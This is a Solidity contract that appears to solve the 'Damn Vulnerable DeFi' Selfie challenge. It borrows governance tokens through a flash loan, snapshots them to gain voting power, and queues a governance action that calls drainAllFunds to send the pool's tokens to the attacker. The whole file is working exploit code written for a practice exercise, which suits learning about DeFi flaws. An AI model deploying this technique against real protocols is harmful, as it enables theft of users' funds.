// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract Attacker6 {
    SimpleGovernance private gov;
    address private poolAddr;
    address private owner;
    uint256 private attackId;

    constructor(address _govAddr) {
        gov = SimpleGovernance(_govAddr);
        owner = msg.sender;
    }

    function prepareAttack(address _poolAddr) public {
        poolAddr = _poolAddr;
        SelfiePool(_poolAddr).flashLoan(1500000 ether);
    }

    function executeAttack() public {
        gov.executeAction(attackId);
    }

    function receiveTokens(address _tokenAddr, uint256 _amount) public {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_tokenAddr);
        token.snapshot();

        attackId = gov.queueAction(
            poolAddr,
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        token.transfer(msg.sender, _amount);
    }
}
